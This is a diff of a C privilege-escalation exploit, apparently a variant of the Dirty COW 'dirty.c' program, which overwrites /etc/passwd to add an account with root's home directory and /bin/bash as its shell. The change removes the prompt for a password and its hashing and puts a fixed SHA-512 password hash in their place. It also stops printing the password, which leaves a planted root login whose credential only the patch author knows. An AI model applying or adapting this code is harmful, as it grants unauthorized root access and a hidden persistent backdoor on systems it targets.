@@ -40,7 +40,6 @@
 #include <sys/ptrace.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <crypt.h>
 
 const char *filename = "/etc/passwd";
 const char *backup_filename = "/tmp/passwd.bak";
@@ -61,10 +60,6 @@ struct Userinfo {
    char *home_dir;
    char *shell;
 };
-
-char *generate_password_hash(char *plaintext_pw) {
-  return crypt(plaintext_pw, salt);
-}
 
 char *generate_passwd_line(struct Userinfo u) {
   const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
@@ -135,16 +130,7 @@ int main(int argc, char *argv[])
   user.home_dir = "/root";
   user.shell = "/bin/bash";
 
-  char *plaintext_pw;
-
-  if (argc >= 2) {
-    plaintext_pw = argv[1];
-    printf("Please enter the new password: %s\n", plaintext_pw);
-  } else {
-    plaintext_pw = getpass("Please enter the new password: ");
-  }
-
-  user.hash = generate_password_hash(plaintext_pw);
+  user.hash = "$6$r5kX6LVR/dXdUArj$DAZ4E3MuWWzIF8j3yC8xheUN2mJ.LPxueqxbynBqRNUxlcjgcmFce6DWFs2LuypjyFiULnOy66DY0UxovmhkC0";
   char *complete_passwd_line = generate_passwd_line(user);
   printf("Complete line:\n%s\n", complete_passwd_line);
 
@@ -185,8 +171,8 @@ int main(int argc, char *argv[])
   }
 
   printf("Done! Check %s to see if the new user was created.\n", filename);
-  printf("You can log in with the username '%s' and the password '%s'.\n\n",
-    user.username, plaintext_pw);
+  printf("You can log in with the username '%s'.\n\n",
+    user.username);
     printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
     backup_filename, filename);
   return 0;
